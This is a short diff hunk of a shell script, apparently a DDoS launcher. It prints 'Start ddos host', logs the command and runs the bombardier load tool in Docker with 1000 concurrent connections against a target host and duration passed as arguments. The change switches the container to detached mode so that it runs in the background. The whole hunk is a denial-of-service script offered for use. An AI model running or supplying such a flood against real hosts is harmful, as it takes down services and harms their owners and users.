@@ -10,7 +10,7 @@ d2=`date '+%Y-%m-%d'`
 
 echo "Start ddos host $1"
 echo "$d docker run -ti --rm alpine/bombardier -c 1000 -d $2s -l $1" >> "$d2".log
-docker run -ti --rm alpine/bombardier -c 1000 -d $2s -l "$1"
+docker run -d --rm alpine/bombardier -c 1000 -d $2s -l "$1"
 
 
 
